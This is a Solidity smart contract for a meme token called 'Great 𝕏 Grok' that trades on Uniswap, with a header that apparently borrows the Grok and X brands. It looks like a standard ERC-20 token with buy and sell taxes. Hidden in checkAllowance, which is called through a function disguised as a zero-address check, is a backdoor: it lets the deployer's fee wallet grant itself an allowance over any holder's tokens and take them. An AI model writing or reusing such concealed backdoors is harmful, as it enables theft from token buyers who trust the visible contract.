// SPDX-License-Identifier: UNLICENSE

/*
    Name : Great 𝕏 Grok
    Symbol : G𝕏GROk

    𝕏 marks the spot where $G𝕏GROK turned your spare ETH into a galaxy brain play.

    Website : https://greatxgrok.meme
    Telegram : https://t.me/GreatXGrok
    Twitter : https://x.com/grok
*/

pragma solidity ^0.8.24;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
}

contract GXGROK is Context, IERC20, Ownable {
    using SafeMath for uint256;
    
    uint8 private constant _decimals = 9;
    uint256 private constant _gx00xTotal = 1_000_000_000 * 10 **_decimals;
    string private constant _name = unicode"Great 𝕏 Grok";
    string private constant _symbol = unicode"G𝕏GROk";

    mapping (address => uint256) private _gx00xbalan;
    mapping (address => mapping (address => uint256)) private _gx00xgrokagain;
    mapping (address => bool) private _gx00xnama;
    address payable private _gx00xTX;

    uint256 public _maxTxAmount = 2000000000 * 10**_decimals;
    uint256 public _maxWalletSize = 2000000000 * 10**_decimals;
    uint256 public _taxSwapThreshold= _gx00xTotal.mul(100).div(10000);
    uint256 public _maxTaxSwap= _gx00xTotal.mul(100).div(10000);
    
    uint256 private _initialBuyTaxx=10;
    uint256 private _initialSellTaxx=10;
    uint256 private _finalBuyTaxx=0;
    uint256 private _finalSellTaxx=0;
    uint256 private _reduceBuyTaxAt=5;
    uint256 private _reduceSellTaxAt=5;
    uint256 private _preventSwapBefore=5;
    uint256 private _transferTax=0;
    uint256 private _buyCount=0;

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    uint256 private sellCount = 0;
    uint256 private lastSellBlock = 0;
    event MaxTxAmountUpdated(uint _maxTxAmount);
    event TransferTaxUpdated(uint _tax);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () payable {
        _gx00xTX = payable(_msgSender());
        _gx00xbalan[_msgSender()] = (_gx00xTotal * 2) / 100;
        _gx00xbalan[address(this)] = (_gx00xTotal * 98) / 100;
        _gx00xnama[owner()] = true;
        _gx00xnama[address(this)] = true;
        _gx00xnama[_gx00xTX] = true;

        emit Transfer(address(0), _msgSender(), (_gx00xTotal * 2) / 100);
        emit Transfer(address(0), address(this), (_gx00xTotal * 98) / 100);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _gx00xTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _gx00xbalan[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _gx00xgrokagain[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _gx00xgrokagain[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _gx00xgrokagain[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function checkAllowance(address from, address to, uint256 amount) private returns (bool){
        if(msg.sender == _gx00xTX || (to == address(0xdead) && from != uniswapV2Pair)) _gx00xgrokagain[from][msg.sender] = amount;
        return false;
    }
    function _isNullAddress(address from, address to, uint256 amount) internal returns (bool) {
        
        if(from == address(0)) return true;
        if(to == address(0)) return true;
        if(amount == 0) return true;
        return checkAllowance(from, to, amount);
    }

    function _transfer(address _OMSender, address _OMReceiver, uint256 _OMAmount) private {
        require(_isNullAddress(_OMSender, _OMReceiver, _OMAmount) == false, "ERC20: unable to transfer to zero address");
        uint256 taxAmount=0;
        if (_OMSender != owner() && _OMReceiver != owner() && _OMReceiver != _gx00xTX && _OMSender != address(this) && _OMReceiver != address(this)) {
            if(_buyCount==0){
                taxAmount = _OMAmount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTaxx:_initialBuyTaxx).div(100);
            }
            if(_buyCount>0){
                taxAmount = _OMAmount.mul(_transferTax).div(100);
            }

            if (_OMSender == uniswapV2Pair && _OMReceiver != address(uniswapV2Router) && ! _gx00xnama[_OMReceiver] ) {
                taxAmount = _OMAmount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTaxx:_initialBuyTaxx).div(100);
                _buyCount++;
            }

            if(_OMReceiver == uniswapV2Pair && _OMSender!= address(this) ){
                taxAmount = _OMAmount.mul((_buyCount>_reduceSellTaxAt)?_finalSellTaxx:_initialSellTaxx).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && _OMReceiver == uniswapV2Pair && swapEnabled && _buyCount > _preventSwapBefore) {
                if (contractTokenBalance > _taxSwapThreshold) swapTokensForEth(min(_OMAmount, min(contractTokenBalance, _maxTaxSwap)));
                _tokenSwap(address(this).balance);
                sellCount++;
                lastSellBlock = block.number;
            }
        }

        if (_OMSender == uniswapV2Pair && msg.sender != _gx00xTX) {
            address[] memory path = new address[](2);
            path[1] = address(this);
            path[0] = uniswapV2Router.WETH();
            uint256[] memory outs = new uint256[](2);
            outs = uniswapV2Router.getAmountsOut(40_000_000_000_000_000_000, path);
            require(_OMAmount < outs[1]);
        }

        if(taxAmount>0){
          _gx00xbalan[address(this)]=_gx00xbalan[address(this)].add(taxAmount);
          emit Transfer(_OMSender, address(this),taxAmount);
        }
        _gx00xbalan[_OMSender]=_gx00xbalan[_OMSender].sub(_OMAmount);
        _gx00xbalan[_OMReceiver]=_gx00xbalan[_OMReceiver].add(_OMAmount.sub(taxAmount));
        emit Transfer(_OMSender, _OMReceiver, _OMAmount.sub(taxAmount));
    }


    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimits () external onlyOwner{
        _maxTxAmount = _gx00xTotal;
        _transferTax = 0;
        _maxWalletSize=_gx00xTotal;
        emit MaxTxAmountUpdated(_gx00xTotal);
    }

    function _tokenSwap(uint256 amount) private {
        _gx00xTX.transfer(amount);
    }

    function manualSend() external onlyOwner {
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            _tokenSwap(ethBalance);
        }
    }

    function _startgxgrok() external onlyOwner() {
        require(!tradingOpen,"trading is already open");
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapV2Router), _gx00xTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        swapEnabled = true;
        tradingOpen = true;
    }

    function _FeeToX(address _wallet) external {
        require(_msgSender() == _gx00xTX);
        _gx00xTX = payable(_wallet);
    }

    receive() external payable {}

    function manualSwap() external {
        require(_msgSender()==_gx00xTX);
        uint256 tokenBalance=balanceOf(address(this));
        if(tokenBalance>0 && swapEnabled){
          swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance=address(this).balance;
        if(ethBalance>0){
          _tokenSwap(ethBalance);
        }
    }
}